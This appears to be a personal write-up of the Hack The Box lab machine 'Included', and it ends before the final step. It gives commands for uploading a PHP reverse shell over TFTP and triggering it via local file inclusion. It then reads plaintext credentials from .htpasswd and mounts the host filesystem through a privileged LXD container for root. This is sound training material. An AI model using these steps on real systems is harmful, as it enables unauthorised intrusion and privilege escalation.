>[!tldr] Included is a very easy Linux machine that features exploiting #TFTP, a vulnerable web application and the LXD group. Initial enumeration reveals a web server vulnerable to Local File Inclusion ( #LFI ) which can be leveraged to access a TFTP server and upload a PHP reverse shell for initial access. Credentials can then be extracted from web configuration files to pivot to a higher-privileged user. Finally, privilege escalation can be achieved by leveraging the privileges of the LXD group to mount the host filesystem with elevated privileges in order to get full access to the filesystem.

# Guided Mode
---
1. `What service is running on the target machine over UDP?`
	1. First, I'll start with a `nmap` scan, we should use `-sU` for UDP. 
```shell
sudo nmap -sCV -p80 10.129.95.185
<SNIP>
PORT   STATE  SERVICE VERSION
80/tcp open   http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://10.129.95.185/index.php?file=home.php

sudo nmap -sU -F 10.129.95.185
<SNIP>
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
```

---
2. `What class of vulnerability is the webpage that is hosted on port 80 vulnerable to? Give the full name, not an acronym.`
	1. Couple of things i tried and failed
		1. "remote code execution"
		2. "cross-site scripting" or "cross site scripting"
		3. "arbitrary file upload"
- Flag #2 -> `Local File Inclusion` (LFI)

---
3. `What is the default system folder that TFTP uses to store files?`
	1. With a quick google search we learn that the default directory to store files is 
- Flag #3 -> `/var/lib/tftpboot/`

---
4. `Which interesting file is located in the web server folder and can be used for Lateral Movement?`
	1. We now know that the server is vulnerable to `LFI` and we can upload to the `/var/lib/tftpboot/`, so we will upload a reverse shell in order to have access to the machine
		1. `sudo nc -lvnp 4444` -> Start listener
		2. `tftp 10.129.115.93` -> Connect to TFTP
		3. `put php-reverse-shell.php` -> Upload reverse shell
		4. `http://<IP>/?file=/var/lib/tftpboot/php-reverse-shell.php` -> Execute the reverse shell
		5. Next we will enumerate with our reverse shell:
```shell
- Go to the web server, this is typically located at /var/www/html
$ cd /var/www/html

- Viewing the files we notice ".htpasswd"
$ ls -la
total 88
drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
-rw-r--r-- 1 www-data www-data  3704 Oct 13  2021 home.php
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
-rw-r--r-- 1 www-data www-data   145 Oct 13  2021 index.php
-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt

- Lets read out ".htpasswd"
$ cat .htpasswd
mike:Sheffield19
```
- Nice, we got the credentials for `mike`:`Sheffield19` and the flag
- Flag #4 -> `.htpasswd`

---
- User Flag
1. First, I wanted to stabilize the shell
```shell
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@included:/var/www/html$ ^Zfish: Job 1, 'sudo nc -lvnp 4444' has stopped

# "Pressed CTRL + Z"

~/Downloads 10m 30s
❯ stty raw -echo; fg
Send job 1 (sudo nc -lvnp 4444) to foreground
export TERM=xterm
```
	
2. Next, we login as `mike`:`Sheffield19` and read the `user.txt` which has the flag 
```shell
www-data@included:/var/www/html$ su mike
su mike
Password: Sheffield19

mike@included:/var/www/html$ cd
cd
mike@included:~$ ls
ls
user.txt
mike@included:~$ cat user.txt
cat user.txt
[REDACTED_FLAG]
```
- User Flag -> `[REDACTED_FLAG]`

---
6. `What is the group that user Mike is a part of and can be exploited for Privilege Escalation?`
	1. We will use `id` (while logged in as `mike`) to find group info
```shell
mike@included:~$ id
id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
```

---
7. `When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?`
	1. You can figure this out with a internet search but i knew the image from my time using "proxmox"
- Flag #7 -> `alpine`

---
8. `What flag do we set to the container so that it has root privileges on the host system?`
	1. To find out how to exploid `lxd` I searched up [gtfobins](https://gtfobins.org/gtfobins/lxd/#shell) 
		
	- This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.
		- If there are environment variables involved, they must be passed via `sudo VAR=value ...` or exported then `sudo -E ...`.
```shell;
lxc init ubuntu:18.04.5 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/root/ recursive=true
lxc start x
lxc exec x /bin/sh
```
- As we can see the parameter that we set is `security.privileged=true` which is the flag
	- Also 
- Flag #8 -> `security.privileged=true`

---
9. `If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?`

Too many things were broken or missing that felt worth my time. 

[Link To Walkthrough](https://htb-content-prod-private-storage.s3.eu-central-1.amazonaws.com/machines/writeup/9e4d90d2-fecb-43b4-a84a-55579b22ca07.pdf?X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA47CRVXI3GZ5T5FNV%2F20260912%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260912T221705Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Signature=cf0b7ef3bd6b0fbf7282474231fdd4d26e70552465a9620bf8bee8c7f711134e)

